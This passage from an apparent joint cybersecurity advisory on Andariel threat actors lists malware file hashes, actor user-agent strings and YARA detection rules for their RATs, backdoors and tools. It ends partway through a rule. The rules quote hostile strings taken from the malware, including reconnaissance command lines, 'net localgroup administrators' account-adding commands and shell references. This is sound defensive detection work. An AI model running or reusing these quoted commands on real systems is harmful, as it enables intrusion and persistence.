<li>452ca47230afd4bb85c45af54fcacbfa544208ef8b4604c3c5caefe3a64dcc19</li>
<li>199ba618efc6af9280c5abd86c09cdf2d475c09c8c7ffc393a35c3d70277aed1</li>
<li>2eb16dbc1097a590f07787ab285a013f5fe235287cb4fb948d4f9cce9efa5dbc</li>
<li>ce779e30502ecee991260fd342cc0d7d5f73d1a070395b4120b8d300ad11d694</li>
<li>db6a9934570fa98a93a979e7e0e218e0c9710e5a787b18c6948f2eedd9338984</li>
<li>c28bb61de4a6ad1c5e225ad9ec2eaf4a6c8ccfff40cf45a640499c0adb0d8740</li>
<li>34d5a5d8bec893519f204b573c33d54537b093c52df01b3d8c518af08ee94947</li>
<li>664f8d19af3400a325998b332343a9304f03bab9738ddab1530869eff13dae54</li>
<li>772b06f34facf6a2ce351b8679ff957cf601ef3ad29645935cb050b4184c8d51</li>
<li>aa29bf4292b68d197f4d8ca026b97ec7785796edcb644db625a8f8b66733ab54</li>
<li>9a5504dcfb7e664259bfa58c46cfd33e554225daf1cedea2ec2a9d83bbbfe238</li>
<li>c2500a6e12f22b16e221ba01952b69c92278cd05632283d8b84c55c916efe27c</li>
<li>8aa6612c95c7cef49709596da43a0f8354f14d8c08128c4cb9b1f37e548f083b</li>
<li>38f0f2d658e09c57fc78698482f2f638843eb53412d860fb3a99bb6f51025b07</li>
</ul>
</div>
<p>The following include a list of user agent strings used by the actors:</p>
<ul>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0</li>
<li>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</li>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</li>
<li>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0</li>
<li>Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</li>
<li>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</li>
<li>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)</li>
<li>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</li>
<li>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</li>
<li>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</li>
</ul>
<h2><strong>Detection Methods</strong></h2>
<p>See Table 2 for YARA rules, created by the FBI, authoring partners, and private industry, that can be used to detect malware used by the actors.</p>
<table>
<caption><em>Table 2. YARA Rules</em></caption>
<tbody>
<tr>
<td>rule Andariel_ScheduledTask_Loader<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $obfuscation1 = { B8 02 00 00 00 48 6B C0 00 B9 CD FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 01 B9 CC FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 02 B9 8D FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 03 B9 9A FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 04 B9 8C FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 05 B9 8A FF 00 00 66 89 8C 04 60 01 00 00 B8 02 00 00 00 48 6B C0 06 33 C9 66 89 8C 04 60 01 00 00 }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $obfuscation2 = { 48 6B C0 02 C6 44 04 20 BA B8 01 00 00 00 48 6B C0 03 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 04 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 05 C6 44 04 20 8A B8 01 00 00 00 48 6B C0 06 C6 44 04 20 9C B8 01 00 00 00 }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $obfuscation3 = { 48 6B C0 00 C6 44 04 20 A8 B8 01 00 00 00 48 6B C0 01 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 02 C6 44 04 20 93 B8 01 00 00 00 48 6B C0 03 C6 44 04 20 96 B8 01 00 00 00 48 6B C0 04 C6 44 04 20 B9 B8 01 00 00 00 48 6B C0 05 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 06 C6 44 04 20 8B B8 01 00 00 00 48 6B C0 07 C6 44 04 20 9E B8 01 00 00 00 48 6B C0 08 C6 44 04 20 9A B8 01 00 00 00 48 6B C0 09 C6 44 04 20 8D B8 01 00 00 00 48 6B C0 0A C6 44 04 20 BC B8 01 00 00 00 }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5A4D and $obfuscation1 and $obfuscation2 and $obfuscation3<br>}</td>
</tr>
<tr>
<td>rule Andariel_KaosRAT_Yamabot<br>{<br><br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $str1 = \"/kaos/\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str2 = \"Abstand [\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str3 = \"] anwenden\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str4 = \"cmVjYXB0Y2hh\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str5 = \"/bin/sh\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str6 = \"utilities.CIpaddress\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str7 = \"engine.NewEgg\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str8 = \"%s%04x%s%s%s\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str9 = \"Y2FwdGNoYV9zZXNzaW9u\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str10 = \"utilities.EierKochen\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $str11 = \"kandidatKaufhaus\"<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 3 of them<br>}</td>
</tr>
<tr>
<td>rule TriFaux_EasyRAT_JUPITER<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $InitOnce = \"InitOnceExecuteOnce\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $BREAK = { 0D 00 0A 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 2D 00 0D 00 0A }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $Bytes = \"4C,$00,$00,$00,$01,$14,$02,$00,$00,$00,$00,$00,$C0,$00,$00,$00,$00,$00,$00,\" wide<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_CutieDrop_MagicRAT<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strings:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_w = \"os/windows\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_l = \"os/linux\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_os_m = \"os/mac\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_comp_msft = \"company/microsoft\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $config_comp_orcl = \"company/oracle\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_1 = \"session=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_2 = \"type=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $POST_field_3 = \"id=\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $command_misspelled = \"renmae\" ascii wide<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; condition:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; uint16(0) == 0x5a4d and 7 of them</td>
</tr>
<tr>
<td>rule Andariel_hhsd_FileTransferTool<br>{<br><br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; // 30 4D C7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor&nbsp; &nbsp; &nbsp;[rbp+buffer_v41+3], cl<br>&nbsp; &nbsp; &nbsp; &nbsp; // 81 7D C4 22 C0 78 00&nbsp; &nbsp; cmp&nbsp; &nbsp; &nbsp; dword ptr [rbp+buffer_v41], 78C022h<br>&nbsp; &nbsp; &nbsp; &nbsp; // 44 88 83 00 01 00 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbx+100h], r8b<br>&nbsp; &nbsp; &nbsp; &nbsp; $handshake = { 30 ?? ?? 81 7? ?? 22 C0 78 00 4? 88 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; // B1 14&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov&nbsp; &nbsp; &nbsp;cl, 14h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 F7 14 00 41 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+Src], 410014h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 FB 7A 00 7F 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_5C], 7F007Ah<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 FF 7B 00 63 00&nbsp; &nbsp; mov &nbsp; &nbsp; [rbp+57h+var_58], 63007Bh<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 03 7A 00 34 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_54], 34007Ah<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 07 51 00 66 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_50], 660051h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 0B 66 00 7B 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_4C], 7B0066h<br>&nbsp; &nbsp; &nbsp; &nbsp; // C7 45 0F 66 00 00 00&nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp; [rbp+57h+var_48], 66h ; 'f'<br>&nbsp; &nbsp; &nbsp; &nbsp; $err_xor_str = { 14 C7 [2] 14 00 41 00 C7 [2] 7A 00 7F 00 C7 [2] 7B 00 63 00 C7 [2] 7A 00 34 00 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; // 41 02 D0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add&nbsp; &nbsp; &nbsp;dl, r8b<br>&nbsp; &nbsp; &nbsp; &nbsp; // 44 02 DA&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add&nbsp; &nbsp; &nbsp;r11b, dl<br>&nbsp; &nbsp; &nbsp; &nbsp; // 3C 1F&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cmp&nbsp; &nbsp; &nbsp;al, 1Fh<br>&nbsp; &nbsp; &nbsp; &nbsp; $buf_add_cmp_1f = { 4? 02 ?? 4? 02 ?? 3? 1F }</td>
</tr>
<tr>
<td>&nbsp; &nbsp; &nbsp; &nbsp; // B9 8D 10 B7 F8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov&nbsp; &nbsp; &nbsp;ecx, 0F8B7108Dh<br>&nbsp; &nbsp; &nbsp; &nbsp; // E8 F1 BA FF FF&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; sub_140001280<br>&nbsp; &nbsp; &nbsp; &nbsp; $hash_call_loadlib = { B? 8D 10 B7 F8 E8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; $hash_call_unk = { B? 91 B8 F6 88 E8 }<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and<br>&nbsp; &nbsp; &nbsp; &nbsp; (any of ($handshake, $err_xor_str, $buf_add_cmp_1f) and any of ($hash_call_*)) or<br>&nbsp; &nbsp; &nbsp; &nbsp; 2 of ($handshake, $err_xor_str, $buf_add_cmp_1f)</td>
</tr>
<tr>
<td>rule Andariel_Atharvan_3RAT<br>{<br>strings:<br>$3RAT = \"D:\\\\rang\\\\TOOL\\\\3RAT\"&nbsp;<br>$atharvan = \"Atharvan_dll.pdb\"<br>condition:<br>uint16(0) == 0x5a4d and any of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_LilithRAT_Variant<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; // The following are strings seen in the open source version of Lilith<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_1 = \"Initiate a CMD session first.\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_2 = \"CMD is not open\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_3 = \"Couldn't write command\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $lilith_4 = \"Couldn't write to CMD: CMD not open\" ascii wide<br><br>&nbsp; &nbsp; &nbsp; &nbsp; // The following are strings that appear to be unique to the Unnamed Trojan based on Lilith<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_1 = \"Upload Error!\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_2 = \"ERROR: Downloading is already running!\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_3 = \"ERROR: Unable to open file:\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_4 = \"General error\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_5 = \"CMD error\" ascii wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $unique_6 = \"killing self\" ascii wide<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and filesize &lt; 150KB and all of ($lilith_*) and 2 of ($unique_*)<br>}</td>
</tr>
<tr>
<td>rule Andariel_SocksTroy_Strings_OpCodes<br>{<br>&nbsp; &nbsp; &nbsp; &nbsp;strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $strHost = \"-host\" wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $strAuth = \"-auth\" wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $SocksTroy = \"SocksTroy\"&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; $cOpCodeCheck = { 81 E? A0 00 00 00 0F 84 ?? ?? ?? ?? 83 E? 03 74 ?? 83 E? 02 74 ?? 83 F? 0B }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and<br>&nbsp; &nbsp; &nbsp; &nbsp; ((1 of ($str*)) and&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; (all of ($c*)) or (all of ($Socks*)))<br>}</td>
</tr>
<tr>
<td>rule Andariel_Agni<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $xor = { 34 ?? 88 01 48 8D 49 01 0F B6 01 84 C0 75 F1 }<br>&nbsp; &nbsp; &nbsp; &nbsp; $stackstrings = {C7 44 24 [5-10] C7 44 24 [5] C7 44 24 [5-10] C7 44 24 [5-10] C7 44 24}<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and (#xor &gt; 100 and #stackstrings &gt; 5)<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_handshake<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = { 66 C7 00 AB CD C6 40 02 EF ?? 03 00 00 00 48 89 C1 ?? 03 00 00 00 }<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_tasks<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.ScreenMonitThread\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.CmdShell\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.GetAllFoldersAndFiles\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $ = \"main.SelfDelete\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_GoLang_validalpha_BlackString<br>{<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; $ = \"I:/01___Tools/02__RAT/Black\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; uint16(0) == 0x5A4D and all of them<br>}</td>
</tr>
<tr>
<td>rule INDICATOR_EXE_Packed_VMProtect {<br>&nbsp; &nbsp; &nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \".vmp0\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s2 = \".vmp1\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them or<br>&nbsp; &nbsp; &nbsp; &nbsp; for any i in (0 .. pe.number_of_sections) : (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".vmp0\" or<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".vmp1\"<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<br>&nbsp; &nbsp; &nbsp; &nbsp; )<br>}</td>
</tr>
<tr>
<td>rule INDICATOR_EXE_Packed_Themida {<br>&nbsp; &nbsp; &nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \".themida\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and all of them or<br>&nbsp; &nbsp; &nbsp; &nbsp; for any i in (0 .. pe.number_of_sections) : (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pe.sections[i].name == \".themida\"<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )<br>&nbsp; &nbsp; &nbsp; &nbsp; )<br>}</td>
</tr>
<tr>
<td>rule Andariel_elf_backdoor_fipps<br>{<br>strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $a = \"found mac address\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $b = \"RecvThread\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $c = \"OpenSSL-1.0.0-fipps\"<br>&nbsp; &nbsp; &nbsp; &nbsp; $d = \"Disconnected!\"<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; (all of them) and uint32(0) == 0x464c457f<br>}</td>
</tr>
<tr>
<td>rule Andariel_bindshell<br>{<br>strings:<br>&nbsp;$str_comspec = \"COMSPEC\"<br>&nbsp;$str_consolewindow = \"GetConsoleWindow\"<br>&nbsp;$str_ShowWindow = \"ShowWindow\"<br>&nbsp;$str_WSASocketA = \"WSASocketA\"<br>&nbsp;$str_CreateProcessA = \"CreateProcessA\"<br>&nbsp;$str_port = {B9 4D 05 00 00 89}<br>condition:<br>uint16(0) == 0x5A4D and all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_grease2<br>{<br>strings:<br>&nbsp;$str_rdpconf = \"c: \\\\windows\\\\temp\\\\RDPConf.exe\" fullword nocase<br>&nbsp;$str_rdpwinst = \"c: \\\\windows\\\\temp\\\\RDPWInst.exe\" fullword nocase<br>&nbsp;$str_net_user = \"net user\"<br>&nbsp;$str_admins_add = \"net localgroup administrators\"<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_NoPineapple_Dtrack_unpacked<br>{<br>strings:<br>&nbsp;$str_nopineapple = \"&lt; No Pineapple! &gt;\"<br>&nbsp;$str_qt_library = \"Qt 5.12.10\"<br>&nbsp;$str_xor = {8B 10 83 F6 ?? 83 FA 01 77}<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_dtrack_unpacked<br>{<br>strings:<br>&nbsp;$str_mutex = \"MTX_Global\"<br>&nbsp;$str_cmd_1 = \"/c net use \\\\\\\\\" wide<br>&nbsp;$str_cmd_2 = \"/c ping -n 3 127.0.01 &gt; NUL % echo EEE &gt; \\\"%s\\\"\" wide<br>&nbsp;$str_cmd_3 = \"/c move /y %s \\\\\\\\\" wide<br>&nbsp;$str_cmd_4 = \"/c systeminfo &gt; \\\"%s\\\" &amp; tasklist &gt; \\\"%s\\\" &amp; netstat -naop tcp &gt; \\\"%s\\\"\" wide<br>condition:<br>uint16(0) == 0x5A4D and<br>all of them<br>}</td>
</tr>
<tr>
<td>rule Andariel_TigerRAT_crowdsourced_rule {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $m1 = \".?AVModuleKeyLogger@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m2 = \".?AVModulePortForwarder@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m3 = \".?AVModuleScreenCapture@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $m4 = \".?AVModuleShell@@\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s1 = \"\\\\x9891-009942-xnopcopie.dat\" fullword wide<br>&nbsp; &nbsp; &nbsp; &nbsp; $s2 = \"(%02d : %02d-%02d %02d:%02d:%02d)--- %s[Clipboard]\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s3 = \"[%02d : %02d-%02d %02d:%02d:%02d]--- %s[Title]\" fullword ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s4 = \"del \\\"%s\\\"%s \\\"%s\\\" goto \" ascii<br>&nbsp; &nbsp; &nbsp; &nbsp; $s5 = \"[&lt;&lt;]\" fullword ascii<br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; uint16(0) == 0x5a4d and (all of ($s*) or (all of ($m*) and 1 of ($s*)) or (2 of ($m*) and 2 of ($s*)))<br>}</td>
</tr>
<tr>
<td>rule win_tiger_rat_auto {<br>&nbsp; &nbsp; strings:<br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_0 = { 33c0 89442438 89442430 448bcf 4533c0 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; 5<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89442438&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89442430&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;448bcf&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [eax]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;4533c0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| dec&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_1 = { 41b901000000 488bd6 488bcb e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; 